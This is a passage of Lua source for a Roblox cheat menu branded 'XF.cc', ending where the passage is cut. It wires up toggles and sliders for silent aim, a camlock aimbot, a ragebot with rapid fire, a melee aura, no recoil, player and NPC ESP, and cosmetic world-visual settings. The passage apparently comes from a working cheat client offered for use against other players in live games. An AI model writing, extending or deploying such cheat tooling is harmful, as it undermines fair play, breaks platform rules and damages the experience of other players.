        currentAtmo.Color = WV.AtmoColor
        currentAtmo.Decay = WV.AtmoDecay
        currentAtmo.Density = WV.AtmoDensity
        currentAtmo.Haze = WV.AtmoHaze
        currentAtmo.Glare = WV.AtmoGlare
        currentAtmo.Offset = WV.AtmoOffset
    else
        local currentAtmo = WV_Lit:FindFirstChildOfClass("Atmosphere")
        if currentAtmo and currentAtmo == WV_Atmo then
            currentAtmo.Parent = nil
        elseif currentAtmo then
            currentAtmo.Density = 0
        end
    end

    -- 强制劫持 Skybox
    if WV.SkyboxEnabled then
        local currentSky = WV_Lit:FindFirstChildOfClass("Sky")
        if not currentSky then
            currentSky = WV_Sky
            currentSky.Parent = WV_Lit
        end
        local ids = WV_Skyboxes[WV.SkyboxType]
        if ids then
            currentSky.SkyboxBk = "rbxassetid://" .. ids.Bk
            currentSky.SkyboxDn = "rbxassetid://" .. ids.Dn
            currentSky.SkyboxFt = "rbxassetid://" .. ids.Ft
            currentSky.SkyboxLf = "rbxassetid://" .. ids.Lf
            currentSky.SkyboxRt = "rbxassetid://" .. ids.Rt
            currentSky.SkyboxUp = "rbxassetid://" .. ids.Up
        end
    else
        if WV_Sky.Parent == WV_Lit then WV_Sky.Parent = nil end
    end

    if WV.WeatherEnabled and WV_WeatherPart.Parent then
        WV_WeatherPart.CFrame = Camera.CFrame + Vector3.new(0,25,0)
    end
end)

-- =====================================================================
-- == UI Construction (IIFE: all locals isolated from main chunk)
-- =====================================================================
;(function()
local Window    = Library:Window({Logo="77218680285262", FadeTime=0.3})
local WatermarkConfig = {
    UID = "1",
    ShowDate = true,
    ShowTime = true,
    ShowFPS = true,
    ShowPing = true,
}
local Watermark = Library:Watermark("XF.cc | uid - 1")
Watermark:SetVisibility(false)
local KeybindList = Library:KeybindList()

-- Dynamic watermark: this UID is a custom display value, not the Roblox UserId.
task.spawn(function()
    local last = os.clock()
    local frames = 0
    local fps = 0

    RunService.RenderStepped:Connect(function()
        frames += 1
        local now = os.clock()
        if now - last >= 0.5 then
            fps = math.floor(frames / (now - last) + 0.5)
            frames = 0
            last = now
        end
    end)

    while true do
        local parts = {"XF.cc", "uid - " .. tostring(WatermarkConfig.UID)}

        if WatermarkConfig.ShowDate then
            table.insert(parts, os.date("%b %d, %Y"))
        end
        if WatermarkConfig.ShowTime then
            table.insert(parts, os.date("%H:%M:%S"))
        end
        if WatermarkConfig.ShowFPS then
            table.insert(parts, tostring(fps) .. "fps")
        end
        if WatermarkConfig.ShowPing then
            local ping = "--"
            pcall(function()
                local stats = game:GetService("Stats")
                local item = stats.Network.ServerStatsItem["Data Ping"]
                if item then
                    local value = tostring(item:GetValueString())
                    ping = value:gsub("%s+", "")
                    if not ping:lower():find("ms", 1, true) then
                        ping = ping .. "ms"
                    end
                end
            end)
            table.insert(parts, ping)
        end

        Watermark:SetText(table.concat(parts, " | "))
        task.wait(0.5)
    end
end)

do -- Combat page
    local Page  = Window:Page({Name="Combat", SubPages=true})
    local Rage  = Page:SubPage({Name="Ragebot",    Columns=2})
    local Cam   = Page:SubPage({Name="Legit",      Columns=2})
    local Melee = Page:SubPage({Name="MeleeAura",  Columns=2})
    local SAPage = Page:SubPage({Name="Silent aim", Columns=2})

    do -- Silent Aim
        local s1 = SAPage:Section({Name="Silent Aim", Side=1})
        s1:Toggle({Name="Enable", Flag="CAT_Enable_1", Callback=function(v) SA.Enabled=v end}):Keybind({Flag="CAT_Enable_1_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Enable_1"] then Library.SetFlags["CAT_Enable_1"](v) end end})
        s1:Dropdown({Name="Target Part", Flag="CAT_SA_TargetPart",
            Items={"Random","Head","Torso","Left Arm","Right Arm","Left Leg","Right Leg"},
            Default="Head",
            Callback=function(v)
                if v == "Random" then
                    SA.IsRandom = true
                    SA.RandomIdx = 1
                    SA.RandomTimer = 0
                    SA.TargetPart = SA.RandomParts[1]
                else
                    SA.IsRandom = false
                    SA.TargetPart = v
                end
            end})
        s1:Slider({Name="Hit Chance", Flag="CAT_Hit_Chance_2", Min=0, Max=100, Default=100, Callback=function(v) SA.HitChance=v end})
        s1:Toggle({Name="Wall Check", Flag="CAT_Wall_Check_3", Default=true, Callback=function(v) SA.WallCheck=v end}):Keybind({Flag="CAT_Wall_Check_3_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Wall_Check_3"] then Library.SetFlags["CAT_Wall_Check_3"](v) end end})

        local s2 = SAPage:Section({Name="FOV", Side=2})
        local fovT = s2:Toggle({Name="Draw FOV", Flag="CAT_Draw_FOV_4", Callback=function(v) SA.FOV_Visible=v end})
        fovT:Keybind({Flag="CAT_Draw_FOV_4_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Draw_FOV_4"] then Library.SetFlags["CAT_Draw_FOV_4"](v) end end})
        fovT:Colorpicker({Name="Color", Flag="CAT_Color_5", Default=Color3.fromRGB(255,0,0), Callback=function(v) SA.FOV_Color=v end})
        s2:Dropdown({Name="Position", Flag="CAT_Position_6", Items={"Center","Mouse"}, Default="Center", Callback=function(v) SA.FOV_PositionMode=v end})
        s2:Slider({Name="Radius", Flag="CAT_Radius_7",   Min=10, Max=600, Default=100, Callback=function(v) SA.FOV_Radius=v end})
        s2:Slider({Name="Sides", Flag="CAT_Sides_8",    Min=3,  Max=32,  Default=16,  Callback=function(v) SA.FOV_Sides=math.floor(v) end})
        s2:Toggle({Name="Spin", Flag="CAT_Spin_9",     Default=false, Callback=function(v) SA.FOV_SpinEnabled=v end}):Keybind({Flag="CAT_Spin_9_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Spin_9"] then Library.SetFlags["CAT_Spin_9"](v) end end})
        s2:Slider({Name="Spin speed", Flag="CAT_Spin_speed_10", Min=0, Max=500, Default=50, Callback=function(v) SA.FOV_SpinSpeed=v end})
    end

    do -- Camlock
        local s1 = Cam:Section({Name="Camlock", Side=1})
        s1:Toggle({Name="Enable", Flag="CAT_Enable_11",          Callback=function(v) CL.Enabled=v end}):Keybind({Flag="CAT_Enable_11_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Enable_11"] then Library.SetFlags["CAT_Enable_11"](v) end end})
        s1:Toggle({Name="Target only", Flag="CAT_Target_only_12",     Callback=function(v) CL.TargetOnly=v end}):Keybind({Flag="CAT_Target_only_12_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Target_only_12"] then Library.SetFlags["CAT_Target_only_12"](v) end end})
        s1:Toggle({Name="Auto prediction", Flag="CAT_Auto_prediction_13", Callback=function(v) CL.AutoPrediction=v end}):Keybind({Flag="CAT_Auto_prediction_13_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Auto_prediction_13"] then Library.SetFlags["CAT_Auto_prediction_13"](v) end end})
        s1:Toggle({Name="Down check", Flag="CAT_Down_check_14",      Callback=function(v) CL.DownCheck=v end}):Keybind({Flag="CAT_Down_check_14_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Down_check_14"] then Library.SetFlags["CAT_Down_check_14"](v) end end})
        s1:Slider({Name="FOV", Flag="CAT_FOV_15",          Min=10,  Max=800, Default=170, Callback=function(v) CL.FOV=v end})
        s1:Slider({Name="Power", Flag="CAT_Power_16",        Min=0.1, Max=1,   Default=1,   Decimals=0.1, Callback=function(v) CL.Power=v end})
        s1:Slider({Name="Shake power", Flag="CAT_Shake_power_17",  Min=0,   Max=1,   Default=0.2, Decimals=0.1, Callback=function(v) CL.Shake=v end})
        s1:Slider({Name="Switch delay", Flag="CAT_Switch_delay_18", Min=0.1, Max=1,   Default=0.1, Decimals=0.1, Callback=function(v) CL.Delay=v end})
        local s2 = Cam:Section({Name="Camlock Config", Side=2})
        s2:Dropdown({Name="Target Parts", Flag="CAT_CL_TargetParts",
            Items={"Head","Torso","Left Arm","Right Arm","Left Leg","Right Leg"},
            Default={"Head","Torso","Left Arm","Right Arm","Left Leg","Right Leg"},
            Multi=true, Callback=function(v) CL.TargetParts=v end})
        local s3 = Cam:Section({Name="Other", Side=2})
        s3:Toggle({Name="No Recoil", Flag="CAT_LG_NoRecoil", Default=false, Callback=function(v)
            if v then NR_Enable() else NR_Disable() end
        end}):Keybind({Flag="CAT_LG_NoRecoil_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_LG_NoRecoil"] then Library.SetFlags["CAT_LG_NoRecoil"](v) end end})
        s3:Slider({Name="Recoil", Flag="CAT_LG_RecoilVal", Min=0, Max=1, Default=0, Decimals=0.1, Callback=function(v)
            NR.RecoilVal = v
            if NR.Enabled then NR_Apply() end
        end})
    end

    do -- Melee Aura
        local s = Melee:Section({Name="Melee Aura", Side=1})
        s:Toggle({Name="Enable", Flag="CAT_Enable_19",          Callback=function(v) MA.Enabled=v; if v then StartMeleeLoop() end end}):Keybind({Flag="CAT_Enable_19_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Enable_19"] then Library.SetFlags["CAT_Enable_19"](v) end end})
        s:Toggle({Name="Target only", Flag="CAT_Target_only_20",     Callback=function(v) MA.TargetOnly=v end}):Keybind({Flag="CAT_Target_only_20_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Target_only_20"] then Library.SetFlags["CAT_Target_only_20"](v) end end})
        s:Toggle({Name="Down check", Flag="CAT_Down_check_21",      Callback=function(v) MA.DownCheck=v end}):Keybind({Flag="CAT_Down_check_21_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Down_check_21"] then Library.SetFlags["CAT_Down_check_21"](v) end end})
        s:Slider( {Name="Distance", Flag="CAT_Distance_22",       Min=5, Max=25, Default=20, Callback=function(v) MA.Distance=v end})
        s:Toggle({Name="Show Animations", Flag="CAT_Show_Animations_23", Default=true, Callback=function(v) MA.ShowAnim=v end}):Keybind({Flag="CAT_Show_Animations_23_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Show_Animations_23"] then Library.SetFlags["CAT_Show_Animations_23"](v) end end})
        s:Dropdown({Name="Target Part", Flag="CAT_Target_Part_24",   Items={"Random","Head","Torso","Left Arm","Right Arm","Left Leg","Right Leg"}, Default="Random", Callback=function(v) MA.TargetPart=v end})
    end

    do -- Ragebot
        local s1 = Rage:Section({Name="Settings", Side=1})
        s1:Toggle({Name="Enable", Flag="CAT_Enable_25",       Callback=function(v) RB_State=v end}):Keybind({Flag="CAT_Enable_25_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Enable_25"] then Library.SetFlags["CAT_Enable_25"](v) end end})
        s1:Toggle({Name="Rapid fire", Flag="CAT_Rapid_fire_26",   Callback=function(v) RF_State=v end}):Keybind({Flag="CAT_Rapid_fire_26_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Rapid_fire_26"] then Library.SetFlags["CAT_Rapid_fire_26"](v) end end})
        s1:Toggle({Name="Auto Reload", Flag="CAT_Auto_Reload_27",  Callback=function(v) AutoReload=v; AutoReloadSetup() end}):Keybind({Flag="CAT_Auto_Reload_27_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Auto_Reload_27"] then Library.SetFlags["CAT_Auto_Reload_27"](v) end end})
        s1:Toggle({Name="Auto buy ammo", Flag="CAT_Rage_AutoAmmo_29", Default=false, Callback=function(v)
            SC.ARA_Enabled = v
            if v then StartAutoAmmoRefill() end
        end}):Keybind({Flag="CAT_Rage_AutoAmmo_29_KB", Mode="Toggle", Callback=function(v)
            if Library and Library.SetFlags and Library.SetFlags["CAT_Rage_AutoAmmo_29"] then
                Library.SetFlags["CAT_Rage_AutoAmmo_29"](v)
            end
        end})
        s1:Toggle({Name="Down Check", Flag="CAT_Down_Check_28",   Callback=function(v) DownCheck=v end}):Keybind({Flag="CAT_Down_Check_28_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Down_Check_28"] then Library.SetFlags["CAT_Down_Check_28"](v) end end})
      s1:Slider({Name="Max Cache", Flag="CAT_Max_Cache_30",    Min=0.1, Max=25,  Default=0.5,   Decimals=0.01, Callback=function(v) WB.Threshold=v end})
        s1:Slider({Name="Origin Radius", Flag="CAT_Origin_Radius_31",Min=0.1, Max=20, Default=18.50, Decimals=0.01, Callback=function(v) Origin_Radius=v end})
        s1:Slider({Name="Origin Scans", Flag="CAT_Origin_Scans_32", Min=1,   Max=50, Default=24,    Callback=function(v) Origin_Scans=math.floor(v) end})
        s1:Slider({Name="Scan Rate",    Flag="CAT_Scan_Rate",       Min=1,   Max=60, Default=14,    Callback=function(v) ScanRate=math.floor(v) end})
s1:Slider({Name="Scan Distance",Flag="CAT_Scan_Distance",   Min=100, Max=1260, Default=827, Callback=function(v) ScanDistance=math.floor(v) end})  -- 新增
        
        s1:Slider({Name="Hit Radius", Flag="CAT_Hit_Radius_33",   Min=0.1, Max=25, Default=23.50, Decimals=0.01, Callback=function(v) Hit_Radius=v end})
        s1:Slider({Name="Hit Scans", Flag="CAT_Hit_Scans_34",    Min=1,   Max=50, Default=24,    Callback=function(v) Hit_Scans=math.floor(v) end})
        local s2 = Rage:Section({Name="Target Selection", Side=2})
        s2:Dropdown({Name="Target Mode", Flag="CAT_Target_Mode_35", Items={"Near","Mouse","Centre","Lock"},         Default="Near", Callback=function(v) TargetMode=v end})
        s2:Dropdown({Name="Hit Sound", Flag="CAT_Hit_Sound_36",   Items={"None","Skeet","Neverlose","Gamesense","Liang"}, Default="None", Callback=function(v) HitSoundSelection=v end})
    end
end

do -- Visuals page
    local Page  = Window:Page({Name="Visuals", SubPages=true})
    local Sub   = Page:SubPage({Name="Main", Columns=2})
    local World = Page:SubPage({Name="World", Columns=2})

    do -- World Visuals subpage
        local litSec = World:Section({Name="Lighting", Side=1})
        litSec:Toggle({Name="Lighting Mode", Flag="WV_LightingMode", Default=false, Callback=function(v) WV.LightingModeEnabled=v end}):Keybind({Flag="WV_LightingMode_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["WV_LightingMode"] then Library.SetFlags["WV_LightingMode"](v) end end})
        litSec:Dropdown({Name="Technology", Flag="WV_Technology", Items={"Compatibility","ShadowMap","Voxel","Future"}, Default="ShadowMap", Callback=function(v) WV.LightingMode=v end})
        litSec:Toggle({Name="World Time", Flag="WV_WorldTime", Default=false, Callback=function(v) WV.WorldTimeEnabled=v end}):Keybind({Flag="WV_WorldTime_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["WV_WorldTime"] then Library.SetFlags["WV_WorldTime"](v) end end})
        litSec:Slider({Name="Time", Flag="WV_Time", Min=0, Max=24, Default=12, Decimals=0.1, Callback=function(v) WV.WorldTime=v end})
        local ambT2 = litSec:Toggle({Name="Custom Ambient", Flag="WV_Ambient", Default=false, Callback=function(v) WV.AmbientEnabled=v end})
        ambT2:Keybind({Flag="WV_Ambient_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["WV_Ambient"] then Library.SetFlags["WV_Ambient"](v) end end})
        ambT2:Colorpicker({Name="Indoor", Flag="WV_AmbientColor", Default=Color3.fromRGB(255,255,255), Callback=function(v) WV.AmbientColor=v end})
        ambT2:Colorpicker({Name="Outdoor", Flag="WV_OutdoorColor", Default=Color3.fromRGB(255,255,255), Callback=function(v) WV.OutdoorAmbientColor=v end})

        -- FOV（从原Camera区移来）
        local camSec2 = World:Section({Name="Camera", Side=1})
        camSec2:Slider({Name="FOV", Flag="CAT_VS_CamFOV", Min=50, Max=180, Default=70, Callback=function(v)
            CAM_FOV = math.floor(v)
            Camera.FieldOfView = CAM_FOV
            if not CAM_FOV_Conn then
                CAM_FOV_Conn = Camera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
                    if CAM_FOV and Camera.FieldOfView ~= CAM_FOV then Camera.FieldOfView = CAM_FOV end
                end)
            end
        end})
        camSec2:Slider({Name="Camera distance", Flag="CAT_VS_CamDist", Min=1, Max=40, Default=10, Callback=function(v)
            LocalPlayer.CameraMaxZoomDistance = v
            pcall(function() game:GetService("StarterPlayer").CameraMaxZoomDistance = v end)
        end})

        local skySec = World:Section({Name="Sky & Weather", Side=2})
        skySec:Toggle({Name="Custom Skybox", Flag="WV_Skybox", Default=false, Callback=function(v)
            WV.SkyboxEnabled=v
        end}):Keybind({Flag="WV_Skybox_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["WV_Skybox"] then Library.SetFlags["WV_Skybox"](v) end end})
        skySec:Dropdown({Name="Skybox Theme", Flag="WV_SkyboxType", Items={"Black Storm","Blue Space","Realistic","Stormy","Pink"}, Default="Black Storm", Callback=function(v) WV.SkyboxType=v end})
        local wxT = skySec:Toggle({Name="Weather", Flag="WV_Weather", Default=false, Callback=function(v)
            WV.WeatherEnabled=v
            WV_WeatherPart.Parent = v and Workspace or nil
        end})
        wxT:Keybind({Flag="WV_Weather_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["WV_Weather"] then Library.SetFlags["WV_Weather"](v) end end})
        wxT:Colorpicker({Name="Color", Flag="WV_WeatherColor", Default=Color3.fromRGB(255,255,255), Callback=function(v) WV.WeatherColor=v; WV_Emitter.Color=ColorSequence.new(v) end})
        skySec:Dropdown({Name="Weather Type", Flag="WV_WeatherType", Items={"Rain","Snow"}, Default="Rain", Callback=function(v)
            WV.WeatherType=v
            if v=="Rain" then WV_Emitter.Texture="rbxassetid://1822883048"; WV_Emitter.Speed=NumberRange.new(60); WV_Emitter.Size=NumberSequence.new(10)
            else WV_Emitter.Texture="http://www.roblox.com/asset/?id=99851851"; WV_Emitter.Speed=NumberRange.new(30); WV_Emitter.Size=NumberSequence.new(0.35) end
        end})
        skySec:Slider({Name="Weather Rate", Flag="WV_WeatherRate", Min=100, Max=2000, Default=600, Decimals=1, Callback=function(v) local r=tonumber(v); if r==r then WV_Emitter.Rate=r end end})

        local atmoSec = World:Section({Name="Atmosphere", Side=2})
        local atT = atmoSec:Toggle({Name="Atmosphere", Flag="WV_Atmosphere", Default=false, Callback=function(v) WV.AtmosphereEnabled=v end})
        atT:Keybind({Flag="WV_Atmosphere_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["WV_Atmosphere"] then Library.SetFlags["WV_Atmosphere"](v) end end})
        atT:Colorpicker({Name="Color", Flag="WV_AtmoColor", Default=Color3.fromRGB(255,255,255), Callback=function(v) WV.AtmoColor=v end})
        atT:Colorpicker({Name="Decay", Flag="WV_AtmoDecay", Default=Color3.fromRGB(120,120,120), Callback=function(v) WV.AtmoDecay=v end})
        atmoSec:Slider({Name="Density", Flag="WV_AtmoDensity", Min=0, Max=1, Default=0.35, Decimals=0.01, Callback=function(v) WV.AtmoDensity=v end})
        atmoSec:Slider({Name="Haze",    Flag="WV_AtmoHaze",    Min=0, Max=10, Default=1,   Decimals=0.1,  Callback=function(v) WV.AtmoHaze=v end})
        atmoSec:Slider({Name="Glare",   Flag="WV_AtmoGlare",   Min=0, Max=10, Default=10,  Decimals=0.1,  Callback=function(v) WV.AtmoGlare=v end})

        local audioSec = World:Section({Name="Audio", Side=2})
        audioSec:Toggle({Name="Background Noise", Flag="WV_BGSound", Default=false, Callback=function(v)
            if v then WV_BGSound:Play() else WV_BGSound:Stop() end
        end}):Keybind({Flag="WV_BGSound_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["WV_BGSound"] then Library.SetFlags["WV_BGSound"](v) end end})
        audioSec:Dropdown({Name="Sound Track", Flag="WV_BGTrack", Items={"Windy Winter","Thunderstorm","Light Rain","Night","Day"}, Default="Night", Callback=function(v)
            WV_BGSound.SoundId=WV_Sounds[v]
            if WV_BGSound.IsPlaying then WV_BGSound:Stop(); WV_BGSound:Play() end
        end})
        audioSec:Slider({Name="Volume", Flag="WV_BGVolume", Min=0, Max=100, Default=25, Decimals=1, Callback=function(v) local vol=tonumber(v); if vol==vol then WV_BGSound.Volume=vol/100 end end})
    end

    do -- Skin
        local sec = Sub:Section({Name="Skin", Side=1})
        local ffbt = sec:Toggle({Name="Forcefield body", Flag="CAT_VS_FFBody", Callback=function(v)
            FF_S.BodyEnabled=v
            if v then
                local char=LocalPlayer.Character
                if char then for _,p in ipairs(char:GetChildren()) do if IsBodyPart(p) and not FF_S.BodyProps[p] then FF_S.BodyProps[p]={Material=p.Material,Color=p.Color} end end end
                task.delay(0.1, function() if FF_S.BodyEnabled then ApplyBodyFF() end end)
            else RestoreBody() end
        end})
        ffbt:Keybind({Flag="CAT_VS_FFBody_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_VS_FFBody"] then Library.SetFlags["CAT_VS_FFBody"](v) end end})
        ffbt:Colorpicker({Name="Color", Flag="CAT_Color_37", Default=FF_S.Color, Callback=function(c) FF_S.Color=c; if FF_S.BodyEnabled then ApplyBodyFF() end end})
        sec:Toggle({Name="Forcefield tool", Flag="CAT_VS_FFTool", Callback=function(v)
            FF_S.ToolEnabled=v
            if v then
                local char=LocalPlayer.Character; local tool=char and char:FindFirstChildOfClass("Tool")
                if tool then for _,p in ipairs(tool:GetDescendants()) do if p:IsA("BasePart") and not FF_S.ToolProps[p] then FF_S.ToolProps[p]={Material=p.Material,Color=p.Color} end end end
                task.delay(0.1, function() if FF_S.ToolEnabled then ApplyToolFF() end end)
            else RestoreTool() end
        end}):Keybind({Flag="CAT_VS_FFTool_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_VS_FFTool"] then Library.SetFlags["CAT_VS_FFTool"](v) end end})
    end

    do -- Bullet Tracer
        local sec = Sub:Section({Name="Bullet Tracer", Side=1})
        local t = sec:Toggle({Name="Enable", Flag="CAT_Enable_38", Callback=function(v) TR.Enabled=v end})
        t:Keybind({Flag="CAT_Enable_38_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Enable_38"] then Library.SetFlags["CAT_Enable_38"](v) end end})
        t:Colorpicker({Name="Tracer Color", Flag="CAT_Tracer_Color_39", Default=TR.Color, Callback=function(c,a) TR.Color=c; TR.Alpha=a end})
        sec:Slider({Name="Size", Flag="CAT_Size_40", Min=0.1, Max=10, Default=1, Decimals=0.1, Callback=function(v) TR.Size=v end})
    end

    do -- Hit Log
        local sec = Sub:Section({Name="Hit Log", Side=1})
        sec:Toggle({Name="Enable", Flag="CAT_Enable_41", Callback=function(v) HitLogEnabled=v; if HitLog.Gui then HitLog.Gui.Enabled=v end end}):Keybind({Flag="CAT_Enable_41_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Enable_41"] then Library.SetFlags["CAT_Enable_41"](v) end end})

        local ambSec = Sub:Section({Name="Ambience", Side=1})
        local ambT = ambSec:Toggle({Name="Ambience", Flag="CAT_VS_Ambience", Default=false, Callback=function(v)
            AMB.Enabled = v
            if not v then
                local cc = Camera:FindFirstChild("CATColorCorr")
                if cc then cc.Enabled = false end
            end
        end})
        ambT:Keybind({Flag="CAT_VS_Ambience_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_VS_Ambience"] then Library.SetFlags["CAT_VS_Ambience"](v) end end})
        ambT:Colorpicker({Name="Fog color", Flag="CAT_VS_FogColor", Default=Color3.fromRGB(190,220,255), Callback=function(c) AMB.Color=c end})
        ambSec:Slider({Name="Fog density", Flag="CAT_VS_FogDensity", Min=0, Max=1, Default=0.45, Decimals=0.01, Callback=function(v) AMB.Density=v end})
        ambSec:Slider({Name="Brightness", Flag="CAT_VS_Brightness", Min=-1, Max=1, Default=0.15, Decimals=0.01, Callback=function(v) AMB.Brightness=v end})
    end

    do -- ESP
        local sec = Sub:Section({Name="ESP", Side=2})
        sec:Toggle({Name="Nametag", Flag="CAT_Nametag_42",  Default=false, Callback=function(v) NametagEnabled=v; if not v then for _,p in pairs(Players:GetPlayers()) do local t=p.Character and p.Character:FindFirstChild("CAT_NameTag"); local l=t and t:FindFirstChild("L"); if l then l.Visible=false; if not DistanceEnabled then t.Enabled=false end end end end end}):Keybind({Flag="CAT_Nametag_42_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Nametag_42"] then Library.SetFlags["CAT_Nametag_42"](v) end end})
        sec:Toggle({Name="Distance", Flag="CAT_Distance_43", Default=false, Callback=function(v) DistanceEnabled=v; if not v then for _,p in pairs(Players:GetPlayers()) do local t=p.Character and p.Character:FindFirstChild("CAT_NameTag"); local l=t and t:FindFirstChild("DL"); if l then l.Visible=false; if not NametagEnabled then t.Enabled=false end end end end end}):Keybind({Flag="CAT_Distance_43_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Distance_43"] then Library.SetFlags["CAT_Distance_43"](v) end end})
        sec:Toggle({Name="Health", Flag="CAT_Health_44",   Default=false, Callback=function(v) HealthEnabled=v;  if not v then for _,p in pairs(Players:GetPlayers()) do local t=p.Character and p.Character:FindFirstChild("CAT_NameTag"); local l=t and t:FindFirstChild("HL"); if l then l.Visible=false end end end end}):Keybind({Flag="CAT_Health_44_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Health_44"] then Library.SetFlags["CAT_Health_44"](v) end end})
        sec:Toggle({Name="Info Panel", Flag="CAT_InfoPanel_48", Default=false, Callback=function(v) InfoPanelEnabled=v; if not v then SetInfoPanelVisible(false) end end}):Keybind({Flag="CAT_InfoPanel_48_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_InfoPanel_48"] then Library.SetFlags["CAT_InfoPanel_48"](v) end end})
        sec:Toggle({Name="Safe Chams", Flag="CAT_Safe_Chams_45", Default=false, Callback=function(v) SafeChamsEnabled = v; if v then StartSafeChams() end end}):Keybind({Flag="CAT_Safe_Chams_45_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Safe_Chams_45"] then Library.SetFlags["CAT_Safe_Chams_45"](v) end end})
        local ct = sec:Toggle({Name="Chams", Flag="CAT_VS_Chams", Default=false, Callback=function(v)
            espSets.enabled=v
            if not v then
                if BoxESP.Conn.M then BoxESP.Conn.M:Disconnect() end
                for _,c in pairs(BoxESP.Conn) do if typeof(c)=="RBXScriptConnection" then c:Disconnect() end end
                for p in pairs(BoxESP.Boxes) do clearBoxes(p) end
                BoxESP={Boxes={},Conn={}}
            else
                local function s(p)
                    if p==LocalPlayer then return end
                    BoxESP.Conn[p]=p.CharacterAdded:Connect(function() task.wait(0.5); updatePlayerBoxes(p) end)
                    if p.Character then updatePlayerBoxes(p) end
                end
                for _,p in pairs(Players:GetPlayers()) do s(p) end
                BoxESP.Conn.M=Players.PlayerAdded:Connect(s)
            end
        end})
        ct:Keybind({Flag="CAT_VS_Chams_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_VS_Chams"] then Library.SetFlags["CAT_VS_Chams"](v) end end})
        ct:Colorpicker({Name="Outline Color", Flag="CAT_Outline_Color_46", Default=espSets.outCol, Callback=function(c,a) espSets.outCol=c; espSets.outAlpha=a; if espSets.enabled then refreshAllESP() end end})
        sec:Toggle({Name="Target only", Flag="CAT_Target_only_47", Default=false, Callback=function(v) espSets.targetOnly=v; if espSets.enabled then refreshAllESP() end end}):Keybind({Flag="CAT_Target_only_47_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Target_only_47"] then Library.SetFlags["CAT_Target_only_47"](v) end end})
        sec:Toggle({Name="Outline", Flag="CAT_Outline_48", Default=true, Callback=function(v) espSets.outline=v end}):Keybind({Flag="CAT_Outline_48_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Outline_48"] then Library.SetFlags["CAT_Outline_48"](v) end end})
        local it=sec:Toggle({Name="Inline", Flag="CAT_Inline_49", Default=true, Callback=function(v) espSets.inline=v end})
        it:Keybind({Flag="CAT_Inline_49_KB", Mode="Toggle", Callback=function(v) if Library and Library.SetFlags and Library.SetFlags["CAT_Inline_49"] then Library.SetFlags["CAT_Inline_49"](v) end end})
        it:Colorpicker({Name="Inline Color", Flag="CAT_Inline_Color_50", Default=espSets.inCol, Callback=function(c,a) espSets.inCol=c; espSets.inAlpha=a; if espSets.enabled then refreshAllESP() end end})
        sec:Slider({Name="Outline Size", Flag="CAT_Outline_Size_51", Min=0.01, Max=1,   Default=0.1,  Decimals=0.01, Callback=function(v) espSets.outSize=v end})
        sec:Slider({Name="Inline Size", Flag="CAT_Inline_Size_52",  Min=0.01, Max=0.5, Default=0.05, Decimals=0.01, Callback=function(v) espSets.inSize=v end})
    end
do -- DealerMan ESP + TEC-9 display + Body Colors ESP
    -- ================================================================
    -- State
    -- ================================================================
    local DealerESP = {
        Enabled           = false,   -- DealerMan 透视
        TEC9Show          = false,   -- TEC-9 售卖显示
        BodyColorsEnabled = false,   -- Body Colors 独立透视
        TargetName        = "DealerMan",
        ItemName          = "TEC-9",
        ByModel           = {},      -- DealerMan 模型表
        BodyColorItems    = {},      -- Body Colors 对象表（独立）
        Acc               = 0,
        UpdateInterval    = 0.25,
        Gold              = Color3.fromRGB(255, 215, 0),
    }

    -- ================================================================
    -- Helpers
    -- ================================================================
    local function findShop(model)
        local node = model
